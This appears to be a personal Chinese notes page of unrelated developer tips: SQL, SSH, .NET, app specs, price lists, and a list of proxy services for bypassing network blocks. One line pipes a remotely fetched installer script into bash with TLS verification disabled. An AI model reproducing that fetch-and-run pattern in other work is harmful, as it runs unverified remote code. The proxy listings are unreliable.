document.getElementById(\u0026#39;utcTime\u0026#39;).innerHTML = utcTime; for (const zone in timeZoneOffsets) { const offsets = timeZoneOffsets[zone]; let offset; if (Array.isArray(offsets)) { offset = isDaylightSavingTime(utcDate, zone)? offsets[1] : offsets[0]; } else { offset = offsets; } const zoneDate = new Date(utcDate.getTime() + offset * 60 * 60 * 1000); document.getElementById(zone + \u0026#39;Time\u0026#39;).innerHTML = formatTime(zoneDate); } setTimeout(updateTime, 1000); } window.onload = function () { updateTime(); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 摄像头检测 \u003c!DOCTYPE html\u003e 在线摄像头测试 在线摄像头测试 测试摄像头并检查其是否正确设置。\n说明：\n点击“测试”按钮。\n如果您在浏览器顶部看到权限请求，请单击“允许”。\n如果可以看到您自己或视频流，说明摄像头工作正常。 测试\n.net iis err CS0016 error CS0016: 未能写入输出文件“c:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\6b681329\\aee16571\\App_global.asax.zxufqisi.dll”\u0026ndash;“拒绝访问。 ” 解决办法\n将windows/temp属性-安全-高级 添加IIS_USERS用户，同时编辑权限为完全控制(写入和编辑)即可。\n注意: 要确保权限添加上了，win7下有可能系统为安全，会自动取消你所做的权限设置。先管理员取得所有权，然后在添加。\nCultureInfo(\u0026ldquo;hk\u0026rdquo;) 无效 UseRequestLocalization 配置了 \u0026ldquo;hk\u0026rdquo;，但 .NET 不支持 hk 作为有效的文化代码，导致 .resx 资源文件无法正确加载。需要修改 hk 为 zh-HK。\n.NET 不支持 new CultureInfo(\u0026ldquo;hk\u0026rdquo;)，它不是标准的 .NET 文化代码。\n🔴 错误示例\nnew CultureInfo(\u0026#34;hk\u0026#34;) // ❌ hk 不是 .NET 文化代码 ✔️ 正确示例\nnew CultureInfo(\u0026#34;zh-HK\u0026#34;) // ✅ zh-HK 是正确的文化代码 当前的 supportedCultures 里 hk 是无效的，.NET 不会解析 SharedResource.zh-HK.resx，因此 localizer.GetString(\u0026ldquo;UStatus2p\u0026rdquo;) 只返回键名 UStatus2p。\nvs格式化 Ctrl+K Ctrl+D\nmssql backup 限制访问 SQL还原 DB属性 选项 状态 限制访问 SINGLE\nUSE master; GO ALTER DATABASE databasename SET SINGLE_USER WITH ROLLBACK IMMEDIATE; backup\nALTER DATABASE databasename SET MULTI_USER; GO MULTI_USER\nmysql NOW() 和 CURRENT_DATE() 的区别 NOW() 和 CURRENT_DATE() 的区别 1 返回值类型不同： NOW() 返回的是 DATETIME 类型，包含日期和时间（精确到秒）。 CURRENT_DATE() 返回的是 DATE 类型，仅包含日期部分，不包含时间。 2 精度不同： NOW() 的精度更高，适合用于需要精确时间戳的场合。 CURRENT_DATE() 只提供日期精度，适合在仅关注日期的场景下使用。 3 使用场景不同： 在需要完整时间戳的场合（如日志记录、事件跟踪、时间差计算），NOW() 是更好的选择。 在仅需关注日期的场合（如生日、发布日期、账单日期），CURRENT_DATE() 更加合适。 4 时间计算差异： 使用 NOW() 可以直接进行时间差计算，因为它包含了时间部分。 使用 CURRENT_DATE() 进行时间计算时，比较的只是日期部分，因此在计算时不考虑具体时间。\ndatatime insert NOW() 日期时间 datatime CURRENT_TIMESTAMP 日期时间 CURDATE() 日期\n查重 SELECT UserID, UserName, COUNT() FROM IMUser GROUP BY UserID, UserName HAVING COUNT() \u0026gt; 1;\nmysql 修改 累增 iuser表 UserEMail 为1@qq.com 累增 如2@qq.com 3@qq.com 4@qq.com 有多少用户则该多少个。批量修改 UserEMail 怎么写mysql 在 MySQL 中，你可以使用变量结合UPDATE语句来实现这个批量修改UserEMail字段值的需求。假设表名为iuser，示例代码如下： sql \u0026ndash; 设置初始值为1 SET @num := 1; \u0026ndash; 更新表中的数据 UPDATE iuser SET UserEMail = CONCAT(@num := @num + 1, \u0026lsquo;@qq.com\u0026rsquo;); 代码解释： SET @num := 1;：定义了一个用户变量@num，并初始化为1。 UPDATE iuser SET UserEMail = CONCAT(@num := @num + 1, \u0026lsquo;@qq.com\u0026rsquo;);：在更新语句中，使用CONCAT函数把变量@num不断自增的值与\u0026rsquo;@qq.com\u0026rsquo;拼接起来，再赋值给UserEMail字段。每次更新时，@num变量都会自动加 1，从而达成依次生成1@qq.com、2@qq.com 等邮箱地址的效果。\ndebian 查看系统日志 dmesg | tail -n 50\n修改端口 步骤一：编辑 SSH 配置文件 sudo nano /etc/ssh/sshd_config #Port 22 ⚠️ 注意：如果前面有 #，需要去掉注释。\n步骤二：允许防火墙放行新端口（可选，但建议） 如果你启用了 ufw 防火墙：\nsudo ufw allow 2222/tcp sudo ufw delete allow 22/tcp # 删除旧端口，确认无误后再执行 或者使用 iptables：\nsudo iptables -A INPUT -p tcp --dport 2222 -j ACCEPT 步骤三：重启 SSH 服务 sudo systemctl restart ssh 步骤四：测试新端口是否能登录 在本地或另一台终端执行测试登录：\nssh -p 2222 your_user@your_server_ip 可选：防止被锁死（建议） 在 修改前不要断开现有 SSH 连接，先新开一个 SSH 窗口，测试能否通过新端口登录，确保无误再断开旧的连接。\n禁止休眠 systemctl status sleep.target sleep.target - Sleep Loaded: loaded (/lib/systemd/system/sleep.target; static) Active: inactive (dead) Docs: man:systemd.special(7) systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target Created symlink /etc/systemd/system/sleep.target -\u0026gt; /dev/null. Created symlink /etc/systemd/system/suspend.target -\u0026gt; /dev/null. Created symlink /etc/systemd/system/hibernate.target -\u0026gt; /dev/null. Created symlink /etc/systemd/system/hybrid-sleep.target -\u0026gt; /dev/null.\nsystemctl status sleep.target sleep.target Loaded: masked (Reason: Unit sleep.target is masked.) Active: inactive (dead) Test [iOS] 切换成繁体 默认分组名字显示不对\n• 在 iOS 设备 上，切换应用语言为 繁体中文 后，默认分组名称显示异常。\n• 例如，应该显示 “我的好友”，但实际显示为 “DfName (1人)”（见截图）。\n复现步骤\n打开 App，进入 设置 页面。\n切换系统语言或 App 语言为 繁体中文。\n返回 通讯录，查看 默认分组名称。\n预期结果\n• 默认分组名称应该正确匹配繁体中文翻译，如 “我的好友 ”。\n实际结果\n• 目前分组名称 显示错误，变成 “DfName”，疑似未正确加载本地化文本。\n可能原因（开发可初步排查）\n• 本地化问题：是否缺少繁体中文的本地化翻译？\n• 默认值问题：如果本地化失败，是否 fallback 到错误的默认值 \u0026ldquo;DfName\u0026rdquo;？\n• 缓存问题：切换语言后，是否 UI 或数据未正确刷新？\n环境信息\n• iOS 版本：iOS 17.x\n• App 版本：v1.0.0\n• 设备：iPhone 14 Pro\nhow to talk https://dontasktoask.com/ https://xyproblem.info/ https://nohello.net/zh-cn/ https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md\nwin kill taskkill /f /im node.exe taskkill /k /im go.exe\nwin 启动时间 ‌## 使用命令提示符‌\n按 Win + R 输入 cmd 打开命令提示符。\n输入以下命令并回车：\nsysteminfo | find \u0026#34;系统启动时间\u0026#34; # 或（英文系统）： systeminfo | find \u0026#34;System Boot Time\u0026#34; 结果将显示精确到秒的开机时间。‌\n通过事件查看器‌ 按 Win + X 选择“事件查看器”。 导航至 Windows 日志 \u0026gt; 系统。 点击右侧“筛选当前日志”，输入事件ID 6005（开机）或 6006（关机）。\ndebian/linux 实时显示cpu脚本 bash 脚本 定时显示内存\n#!/bin/bash # 定义颜色常量用于输出格式化 RED=\u0026#39;\\033[0;31m\u0026#39; GREEN=\u0026#39;\\033[0;32m\u0026#39; YELLOW=\u0026#39;\\033[1;33m\u0026#39; NC=\u0026#39;\\033[0m\u0026#39; # 无色 # 函数：获取内存使用情况 get_memory_usage() { free -m | grep Mem: | awk \u0026#39;{print $4}\u0026#39; } # 函数：获取CPU使用率 get_cpu_usage() { top -bn1 | grep \u0026#39;Cpu(s)\u0026#39; | awk \u0026#39;{print $2}\u0026#39; # 获取总CPU使用率（百分比） } # 设置默认时间间隔为1秒，用户可以根据需要调整 INTERVAL=1 # 提示用户输入监控的时间间隔 echo \u0026#34;请输入监控时间间隔（以秒为单位，默认为1秒）：\u0026#34; read INTERVAL # 持续监控系统资源使用情况 while true; do echo -e \u0026#34;\\n$GREEN=$(date +%Y-%m-%d_%H:%M:%S)$NC\u0026#34; echo -e \u0026#34;$YELLOW内存剩余：$(get_memory_usage) MB$NC\u0026#34; echo -e \u0026#34;$RED CPU使用率：$(get_cpu_usage)%$NC\u0026#34; sleep $INTERVAL done ./st.sh\nwaf 雷池 waf bash -c \u0026ldquo;$(curl -fsSLk https://waf-ce.chaitin.cn/release/latest/manager.sh)\u0026quot; https://docs.waf-ce.chaitin.cn/zh/%E4%B8%8A%E6%89%8B%E6%8C%87%E5%8D%97/%E5%AE%89%E8%A3%85%E9%9B%B7%E6%B1%A0#%E8%AE%BF%E9%97%AE%E9%9B%B7%E6%B1%A0%E6%8E%A7%E5%88%B6%E5%8F%B0\nsome key redbook #旅行碎片 #吊带睡衣#朋友圈吃不了的细糠 #拍出氛围感 #牛仔短裤 #完美身材 #夏季穿搭 #腰臀比#人像摄影 #微胖穿搭 #肉腿 #拍照姿势 #海边拍照#日常拍照 #拍照姿势不重样 #无不良引导#肉肉腿 #显瘦裙子 #温柔穿搭#黄豆粉 #来拍照了 #审核员你好 #朋友圈不敢发#对镜拍 #ootd 每日穿搭 #cos正片#海边正常穿搭无不良暗示 #三亚 #ooc致歉\ngaokao 我是一名高考生，7号我要高考，希望闪存里的姐姐们给我发一张穿旗袍的照片祝我旗开得胜，或者发一张穿渔网的照片，祝我一网打尽，再发一张用竹叶遮住胸照片给我，祝我胸有成竹，胸最好是C以上的，让我C位出道，再来一张泳装照，让我泳往直前。\namz 供应链，仓储 海关 保税仓 清仓 交税 海外仓 进出口 国际物流 支付 结算 业务 部门 服务商 对接什么接口\ncode 码上线前有没有做review，有没有做灰度发布、蓝绿发布，每次上线有没有做回归测试，有没有定期做渗透测试、漏洞扫描，安全漏洞有没有做定期修复，生产环境有没有做网络隔离（划分DMZ、内网），有没有准入控制，程序配置文件中密码字段有没有加密，敏感数据落盘（包含日志、数据库）有没有做脱敏和加密\nsoft erp wms crm buy 扫地机 米家 h40 扫地 1460 2025-5-28 手表 Xiaomi Watch S3 443 2025-5-28\n便携屏 爱国者 16英寸便携式显示器 电竞游戏120Hz 375.2 京东补 2025-9-8 显示器 红米 P27FBA-RA 27英寸 IPS 显示器（1920×1080、100Hz、99%sRGB、HDR10） 国补399\n主机 磐镭WO7 R7 7735U迷你主机 16G 1TB -1670 JD补 2025-9-6 主机 V 铭凡 UM870Plus 迷你主机 锐龙R7-8745H、32GB、1TB 京东补 JD国补2363.06 2025-9-8\n主机 磐镭 HO5 AMD 锐龙7 H255迷你主机 16G 1TB 2319 京补\n主机 联想 Lenovo 来酷MINI PRO 迷你台式机（R7-8745H 32G 1TB SSD） 2387.21 JD补 2025-9-6 2500+ 10.1 16G 1900 主机 V 机械师 GTX AMD 高性能办公游戏小主机（R7-8845HS 32G D5 1T ） 2387.01 JD补 2025-8-2\n机械师 GTR 高性能mini迷你主机（R7-8745HS、32G D5、1T SSD) 2379.25元\n主机 铭凡 X1 Pro-370 迷你主机 （AI9 HX 370、核芯显卡、32GB、1TB SSD） 4556.45 JD补 2025-8-2\n笔电 联想 Lenovo 小新14SE 2025 R7-8745HS 16+512G 轻薄本 PDD 2303 笔电 机械革命 无界14X 斗战版 R7-8745HS 16G 512G 高色域 灰 2315.25 京东补 2025-9-8\n笔电 联想 Lenovo 来酷Pro14 2025 锐龙7 H255 32G+1T 2.8K 120Hz 80Wh 3183.21 JD补 2025-9-6\n手机 苹果16 4499 25% 9 30% 手机 16pro 5400 128g JD百亿 手机 17 5099 多多百亿 2025-09-13\n手机 iQOO Z10 Turbo+ 首发 12+512GB 售价 ：2699 元（国补： 2294.15 元） 16+512GB 售价： 2999 元（国补 ：2549.15 元）\n手机 红魔10Pro 5G手机 12GB+512GB 暗夜骑士 骁龙8至尊版 3799元 JD补 2025-09-06\n红魔 Redmagic 10 Pro 5G手机 16GB+512GB 暗夜骑士 骁龙8至尊版 4125.51 JD补 2025-9-25 红魔\t10pro+ 氘锋透明银翼 12GB+256GB 3499 京东补 25-7-12 首选 红魔\t10Pro+ 16GB+512白昼武士 骁龙8至尊 4422.51 京东补 25-8-13 红魔\t10Pro+ 24GB+1TB暗夜骑士 骁龙8至尊 6063 京东补 25-7-3\n平板 win 铭凡V3SE R7-7735U 16 1T 3800 平板 华为matepad air 2025 12+256 2505 PDD百 matepad 11.5s 2025 1905 PDD百 2025-9-6 平板 ipad air 7 M3 2899 京东补 2025-9-10 -39% 充电宝 绿联 67W超能块20000毫安 笔记本充电宝PD快充 可上飞机大容量功率移动户外电源 适用小米苹果华为电脑 126\n不买=win win 折旧50% mac 折旧30%/年\n小霸王掌机g\nPD Prototype design\nBot 工作台 商城管理 交易管理 支付通道 文章系统 权限管理 系统设置 多语言\nIM 核心通讯功能：涵盖群聊、私聊、朋友圈三大场景，支持文字、语音、视频、图片、表情、红包、转账等多元消息发送，且消息可撤回。 群组管理能力：支持设置管理员，可执行禁言、踢人操作；可配置用户信息查看权限，支持 @成员、发群公告，提供扫码入群、邀请好友直接进群功能。 个性化与便捷设置：支持设置好友备注、群名片，可对消息进行置顶、开启免打扰模式，具备关键词屏蔽功能。 增值与互动功能：包含代理功能、VIP 功能及签到功能，提升用户粘性与使用体验。 离线推送规则：iOS 无需上架（需签名支持 push，通过 APN 推送），Android 需上应用商店方可实现，下单前需明确离线消息流程。 性能与数据存储：APP 端本地缓存历史聊天记录、图片及前端程序，实现页面秒开；支持云端同步聊天记录，断网时可流畅切换页面，流畅性接近原生。 分布式 高并发\nIM2 即时通讯：支持一对一、群聊，含文字、语音、图片、视频、文件传输，有已读回执、输入状态提示。 安全隐私：端到端加密，可设密聊及消息自毁，支持密码锁、生物识别。 云端同步：聊天记录云备份，多设备登录且数据实时同步。 检验时间 系统时 UTC时 多少内 有效\nReact或Flutter前端框架，熟悉状态管理、性能优化及跨平台适配。 熟练使用 Go 开发后端服务，了解 ConnectRPC/gRPC 等RPC框架，掌握PostgreSQL数据库设计与优化。 熟悉容器化部署（Docker/Kubernetes）及云服务（AWS/Cloudflare）。\n技术栈： 前端:React、Next.js (需支持SEO)、Flutter 后端:Golang、ConnectRPC、CI/CD (GitHub Actions、Amplify Build) 部署:Cloudflare Pages、Amplify、ECS 数据库:PostgreSQL、Supabase、 通信\u0026amp;序列化:Protobuf 高性能、微服务、高并发架构设计、分布式系统优化以及可观测性\nWIM 即时通讯 (IM) 应用开发需求文档\n项目概述 本项目旨在开发一款即时通讯应用，支持用户间实时消息传递、音视频通话、社交互动等核心功能，提供跨平台使用体验，确保通信安全与性能稳定。 核心功能需求 2.1 用户系统 注册登录：支持手机号验证码、邮箱、第三方账号 (微信、QQ 等) 登录 个人资料管理：头像、昵称、个性签名、性别、地区等信息设置 账号安全：密码修改、登录设备管理、账号冻结 / 解冻 隐私设置：朋友圈权限、消息免打扰、陌生人消息设置 2.2 消息功能 文本消息：支持表情、特殊符号、链接识别 多媒体消息：图片、视频、音频、文件传输 富媒体消息：位置共享、名片分享、语音转文字 消息互动：已读回执、撤回消息、转发消息、收藏消息 消息管理：删除消息、清空聊天记录、消息搜索 群聊功能：创建群聊、群成员管理、群公告、群二维码 2.3 社交功能 联系人管理：添加 / 删除好友、好友分组、黑名单 好友互动：查看朋友圈、点赞评论、朋友圈发布与管理 陌生人互动：附近的人、摇一摇、漂流瓶 (可选) 社交关系：好友请求、验证消息、好友备注 2.4 音视频功能 语音通话：一对一语音、多人语音会议 视频通话：一对一视频、多人视频会议 通话功能：通话记录、通话转移、静音、挂断 通话设置：网络切换自动调整清晰度、通话铃声设置 2.5 附加功能 小程序 / 应用号：第三方应用集成入口 支付功能：转账、红包、支付 (可选) 公众号：关注、推送消息、历史消息查看 朋友圈：发布图文动态、视频动态、删除动态 收藏功能：收藏各类消息、链接、文件 非功能需求 3.1 性能要求 消息发送延迟：\u0026lt;1 秒 (同网络环境) 音视频通话延迟：\u0026lt;300ms 支持同时在线用户：至少 10 万级 群聊人数上限：至少 1000 人 消息存储：支持历史消息无限存储 3.2 安全要求 消息加密：端到端加密确保消息安全 数据安全：用户数据加密存储，防止泄露 登录安全：异常登录检测、设备锁 隐私保护：符合国家数据隐私法规要求 3.3 兼容性要求 平台支持：iOS、Android、Web 端、PC 客户端 系统版本：支持主流系统版本的前 3 个大版本 网络支持：WiFi、4G、5G 环境下稳定运行 3.4 可用性要求 界面响应时间：\u0026lt;200ms 系统可用性：99.9% 以上 错误恢复：支持断线重连、消息重发 技术架构建议 4.1 后端架构 通信协议：TCP/UDP/WebSocket 服务器架构：分布式部署，支持水平扩展 消息队列：处理高并发消息传递 数据库：关系型数据库存储用户信息，NoSQL 存储消息数据 4.2 客户端架构 移动端：原生开发 (iOS: Swift/Objective-C, Android: Kotlin/Java) 跨平台方案：可选 Flutter 实现多端统一 Web 端：React/Vue 等前端框架 状态管理：统一管理用户状态、消息状态 项目阶段规划 第一阶段：核心消息功能 (文本、图片)、用户系统、联系人管理 第二阶段：多媒体消息、群聊功能、朋友圈基础功能 第三阶段：音视频通话、消息扩展功能 (撤回、转发等) 第四阶段：附加功能 (小程序、公众号等)、性能优化 第五阶段：测试、Bug 修复、正式发布 共享自习室 / 共享茶室 小程序 小程序\n前端（用户侧） 微信/支付宝小程序（核心：扫码开门、预约、下单、支付、订单查询）。\n后台管理端 商户/平台管理后台（Web）：茶室管理、订单管理、设备状态监控、价格设置、用户管理。\n服务端 提供 RESTful API + WebSocket（实时设备状态/开门通知）。 与硬件的中控网关对接（MQTT / TCP / HTTP）。 数据库 MySQL / PostgreSQL：存储用户、订单、设备、套餐、计费信息。 Redis：缓存、订单队列、实时设备状态。\n核心功能流程\n用户进入 扫码（ 包间门锁二维码） → 拉起小程序 → 判断是否注册/绑定手机号 → 进入茶室页面。\n开门控制 用户在小程序点击“开门”。 系统校验用户是否已下单或满足进入条件。 后端通过 中控网关 → 智能门锁 下发开门指令。 门锁回传状态（成功/失败） → 后端记录日志。\n消费模式 按时计费：进入后开始计时，离开结算。 套餐计费：用户选套餐（1小时 / 半天 / 茶具套餐）。 商品消费：小程序内点茶水/小食 → 通知茶室柜台/智能柜出货。\n离场与结算 用户点击“结束使用”/“关门” → 后端计算消费金额。 小程序唤起微信/支付宝支付。 结算后推送电子账单。\n后台管理 实时查看茶室使用情况。 管理订单、收入、设备状态。 异常情况（门未关、断电、设备故障）报警。\n计费与支付 支付方式：微信支付。\n计费策略： 入场即计费（分钟计费，保底消费）。 套餐包（如 2 小时 / 1 天 等）。 消耗品（茶叶、茶点）。 离店结算 / 自动扣费：可选“预授权支付”（类似共享充电宝/酒店预授权模式），避免逃单。\n智能门锁\n通信协议：485 / TCP / MQTT / ZigBee / WiFi。 建议通过 中控网关（支持 MQTT/HTTP API） 统一管理。 后端 → 网关 → 门锁，实现远程开关。\n网关层 使用 工控机 / 物联网网关（支持 MQTT/HTTP/TCP）。 网关与硬件通信，统一上传设备状态到云端。 后端只需调用网关 API，无需直接控制每个设备。\n工期\n需求 原型设计：2 – 4 周 软件开发（前端+后端）：2 – 3 个月 硬件对接开发 测试：2 – 3个月 联调 试运营：1 – 2 个月 整体周期：5 – 7 个月\n成本\n软件小程序 用户端 注册、扫码开门、下单、支付、订单查询、个人中心。 5–6 后台管理端 茶室管理、设备状态、订单/财务统计、管理员权限。 4–5 后端 用户、订单、支付、计费逻辑、MQTT硬件对接。 6–9 15–20万\n硬件对接 智能门锁接入 如果厂商提供 SDK/HTTP/MQTT 接口，开发量小 2 – 3 如果要自己适配低层协议（485/TCP） 5 – 8 中控网关（工控机/物联网网关） 一般硬件厂商提供，软件只需对接 → 开发费用 3 – 4 10-15万 （取决于厂商支持）\n总成本 25-35万\n硬件成本 智能门锁：￥200 – ￥1500/个 中控网关：￥2000 – ￥8000/套\n如果要智能柜茶柜/环境灯光音乐 再加成本。\n智能柜 / 茶具柜 带 RFID / 重量传感器：自动识别取出的物品。 用户下单 → 网关 → 控制柜门开锁 → 传感器确认出货 → 回传数据。\n环境控制 空调、灯光、音乐可接入中控（KNX / Modbus / MQTT），通过后台或小程序远程控制。\n人员 用户端 + 后台管理 + 硬件对接\n前端开发（2人）： 小程序/APP（1人） 后台管理系统（1人） 后端开发（2人）： 主业务逻辑、支付、订单、MQTT/网关对接 硬件对接工程师（1人）：负责设备协议、联调 测试（1人）：功能测试、兼容性、压力测试 UI/UX设计（1人）：用户界面、后台界面 项目经理（1人，可以兼职测试）\n6 – 7人，周期 4–6个月。\n岗位工作量 岗位/角色\t主要职责\t预计人天\t说明 项目经理\t需求梳理、进度安排、跨团队协调、风险控制\t60–80\t贯穿项目全程，每周评审 UI/UX 设计师\t用户端/后台原型设计、界面设计、交互规范\t40–60\t早期密集，后期配合调整 前端开发（小程序/APP）\t用户端页面、小程序功能、扫码开门、下单支付\t120–150\tVue/UniApp/Taro 前端开发（后台管理）\t管理后台页面、报表、设备监控\t80–100\tPC Web，Element Plus/Vue3 后端开发（业务）\t用户/订单/支付/计费接口，权限管理\t150–180\tSpring Boot / Django / Node 后端开发（硬件适配）\tMQTT/HTTP 协议、门锁网关对接、设备管理\t80–100\t负责设备指令、状态回传 硬件对接工程师\t设备调试、与供应商联测、协议文档确认\t60–80\t现场测试、异常处理 测试工程师\t功能测试、压力测试、硬件联调、回归测试\t80–100\t包含自动化脚本和手工测试 运维/部署\t云服务器搭建、MQTT Broker部署、监控告警\t20–30\t上线前及试运行阶段\n弹性因素 功能删减：减少 15–20% 人天。 新增硬件种类（智能柜/环境控制）：+15–25%。 如果外包公司有现成框架，可再减少 10–20%。\nGMAE 幻想大陆 史克威尔艾尼克斯开发的 PC 端 3D 角色扮演网络游戏 职业系统：设有战士、法师、游侠 3 种职业，战士可使用刀、斧，具备高防御与高攻击，擅长近身作战；法师用的武器是法杖，能释放各类魔法，但释放时需要咏唱时间；游侠可拿弓箭、短剑，能远距离攻击或潜行靠近敌方发动奇袭，三种职业之间存在相互克制关系。 操作模式：支持鼠标键盘和手柄两种操作方式。鼠标键盘操作下，WASD 键负责移动，空格跳跃，滚轮或数字键 1-8 可变更技能，使用左口袋道具按 F 键，右口袋道具则按 G 键等。手柄操作时，角色移动依靠左模拟摇杆，右模拟摇杆用于视角操作，跳跃对应 Button1，技能发动对应 Button2 等。 战斗模式：涵盖 3D 团队动作竞技模式，包含 2v2、3v3、5v5 等多种规模战斗；乱斗模式，是 5 人或 10 人的个人混战，按杀敌数排名；单挑模式即 1v1 对决；后续还计划开放吃鸡模式、机甲模式等。 召唤兽系统：玩家能通过特定建筑变身召唤兽，比如消耗 30 水晶对着己方城堡召唤骑士，骑士可高速移动且对其他召唤兽攻击力强，也可以消耗 30 水晶在巨人兵营召唤巨人，巨人行动迟缓但对建筑物破坏力强，不同召唤兽都有各自召唤条件和作用。 国战系统：玩家可选择加入纳茨瓦王国、卡萨多利亚联合王国等五个国家中的一个，参与国家之间的对抗，战斗胜利后玩家的称号会发生改变，并且玩家还能从战场获取星石，累积到一定数量可在都城兑换限定装备。 社交系统：拥有好友列表功能，可按 L 键呼出查看，同时支持公会系统，玩家能够自行创建或加入公会，和其他公会成员一起执行任务与挑战副本，另外也有黑名单功能，对应按键是 B 键。 纸娃娃系统：作为全 3D 游戏，采用了 AVATAR 系统，玩家角色可装备物品涉及双手、头部、臂部、躯干、腿部、脚部等 7 个部位，可通过不同装备来改变角色外观呈现个性化效果。\n开发一款 3D 角色扮演网络游戏是一个复杂的系统工程，需要多团队协作、分阶段推进，涉及技术选型、开发流程、资源管理等多个维度。 一、前期筹备阶段 明确核心玩法与定位 细化核心玩法：确定以 “团队竞技 + 国战” 为核心，还是偏向 “角色扮演 + 社交互动”，避免功能臃肿。 目标用户与平台：聚焦 PC 端，明确是否兼容 Steam、Epic 等平台，以及最低配置要求（如显卡、内存）。 商业模式：买断制、内购（外观道具）、订阅制，或三者结合，需提前规划付费点（如纸娃娃系统的个性化装备）。 组建核心团队 核心岗位：游戏策划（系统 / 数值 / 关卡）、程序开发（客户端 / 服务器 / 引擎）、美术设计（3D 建模 / 动画 / 特效）、测试、运营、音效配乐。 初期团队规模建议 20-50 人，后期随功能扩展逐步扩招（如国战系统需增加服务器开发人员）。 技术选型 引擎：优先选用成熟引擎降低开发成本，如 Unreal Engine 5（擅长 3D 画面和大型场景）或 Unity（跨平台适配更灵活，适合中小型团队）。 服务器架构：采用分布式服务器（如微服务架构），支持高并发（国战可能需要千人同屏），技术栈可选 C++（性能优先）或 Go（开发效率高）。 数据库：用 MySQL/PostgreSQL 存储玩家数据，Redis 缓存实时数据（如战斗状态、在线状态）。 网络协议：TCP 保证数据可靠（如交易、任务），UDP 优化实时交互（如战斗、移动），可结合 WebSocket 处理长连接。 二、核心功能开发阶段 按 “基础框架→核心玩法→扩展功能” 的顺序开发，每个阶段需同步进行测试。\n基础框架搭建 客户端基础： 角色控制器：实现 WASD / 手柄的移动、跳跃、视角切换（参考《幻想大陆》的操作模式），支持键鼠 / 手柄无缝切换。 UI 系统：开发基础界面（登录、角色创建、背包、设置），用 UI 框架（如 UGUI、Slate）保证交互流畅。 资源管理：实现模型、贴图、音效的异步加载，优化大型场景（如国战地图）的加载速度。 服务器基础： 账号系统：注册、登录、角色数据存储（包含纸娃娃系统的装备外观数据）。 网络同步：解决客户端与服务器的帧同步（如战斗动作）或状态同步（如位置、血量），避免延迟和卡顿。 安全机制：防外挂（如封包加密、行为检测）、防刷数据（如任务奖励限制）。 核心玩法开发 职业系统： 定义职业属性（战士 / 法师 / 游侠的攻防、技能 CD 等数值），用脚本（如蓝图、Lua）实现技能逻辑（如法师的咏唱前摇、游侠的潜行判定）。 职业克制关系：通过数值公式实现（如战士对法师伤害 + 20%），并在战斗结算中体现。 战斗系统： 3D 动作格斗：开发物理碰撞（如武器命中判定）、技能特效（粒子效果 + 音效），支持连招和打断机制。 多人对战模式：实现 2v2/3v3/5v5 的房间匹配系统，服务器需实时同步多角色位置和技能释放状态。 召唤兽系统：设计召唤条件（如消耗水晶、特定建筑），实现召唤兽 AI（如骑士优先攻击敌方召唤兽）和技能（如巨人拆建筑的范围伤害）。 地图与关卡： 开发竞技地图（中小型，适合 10 人以内对战）和国战地图（大型开放世界，包含城堡、资源点等）。 关卡逻辑：如国战中的 “占领旗帜”“破坏敌方建筑” 等胜利条件，通过触发器（Trigger）实现任务判定。 社交与养成系统 社交系统： 好友 / 黑名单：实现添加、删除、聊天功能，用服务器存储关系数据。 公会系统：支持创建、加入、升级，开发公会任务（如集体击杀 BOSS）、公会仓库等功能。 纸娃娃系统： 3D 角色模型拆分（头部 / 躯干 / 腿部等 7 个部位），实现装备外观的组合显示（如换武器时模型实时更新）。 装备染色 / 幻化：支持自定义颜色或外观，数据存储在角色装备属性中。 国战与成长系统： 国家阵营：玩家选择国家后，限制同阵营玩家互相攻击，开放跨阵营地图（如中立战场）。 奖励机制：国战胜利后发放星石，设计兑换商店（限定装备），并实现称号系统（如 “护国勇士”）的显示与属性加成。 三、测试与优化阶段 功能测试： 单元测试：验证单个功能（如技能释放、召唤兽召唤条件）。 集成测试：测试跨系统交互（如国战中召唤兽与玩家的配合、公会任务与奖励的关联）。 压力测试：模拟千人国战的服务器负载，优化卡顿和崩溃问题（如简化远处角色模型、优化网络同步频率）。 体验优化： 操作手感：调整角色移动速度、技能释放反馈（如震动、音效），适配不同玩家习惯。 画面优化：提供画质选项（低 / 中 / 高），保证低配电脑流畅运行，高配电脑呈现最佳效果。 BUG 修复：重点解决战斗中的卡顿、数据不同步（如玩家血量显示错误）等问题。 四、上线与运营阶段 版本发布： 先推出封闭测试（CTB），邀请少量玩家测试核心功能；再开放公开测试（OBT），收集大规模反馈。 正式上线：在 Steam 等平台发布，同步开放充值、客服系统。 后续迭代： 根据玩家反馈更新内容，如新增职业、地图、模式（如计划中的吃鸡模式、机甲模式）。 长期运营：举办活动（如国战赛季、节日限定外观），维护服务器稳定，持续反外挂。 关键挑战与解决方案 大型场景同步：国战千人同屏时，采用 “分区域加载” 和 “角色优先级渲染”（只同步附近玩家状态）。 数值平衡：职业、召唤兽的强度需通过大量测试调整，避免某一职业 / 召唤兽过于强势。 跨平台兼容：若后续考虑移植主机 / 移动端，需在初期设计时预留接口，统一数据格式。 dark flter 低代码 ERP MES WMS CRM OA\nUnity 王者 Cocos Godot\nJI 良心云com 亏本机场site 备用 mitcenet hongxingdlcom 一分机场com h69yuntop 6云 Aa123 xn\u0026ndash;4gqu8tcnnopecom 一毛机场com\n性价比机场com 1r mitcenet 平替 便宜机场com 6/100 翻墙机场com 4/1000 可莉com 宇宙机场com 5/1000 飞兔com 8/98 云安云com 7/120 paperyunnet 赔钱com 6/1000 x2.xueshan.shop 10r 一分机场com 2/100 iKuuu.me 12/300 shiyuanyinian xyz go1.1010521 xyz 10 9.9/年 www xiaoliyu me 6.8r 1000g\nwww云安云com 7r 120g www冲浪猫官网com 8r200g\nhttps://maomeng.xyz/2021/06/11/ji-chang-tui-jian-chang-qi-geng-xin/\nhttps://app.bujidao.org/user 1000g\nor 第一步：打开你的grok,gemini（深度搜索）,perplexity, 第二步：输入关键词 “请搜索并整理出今天最新可用的v2rayN代理节点的订阅地址，格式要求.txt”， “请搜索并整理出今天最新可用的v2rayN代理节点的订阅地址”， “请搜索并整理出今天最新可用的clash代理节点的订阅地址，格式要求.yaml,来源gitbub”， “请搜索并整理出今天最新可用的clash代理节点的订阅地址”，\nlook 想见你\n哪吒2 无名之辈 三国虾 \u0026lt;一品布衣\u0026gt;\nmc 星星失眠 ninelie 徐梦圆 Eutopia void如履薄冰 水龙吟 知我 壁上观 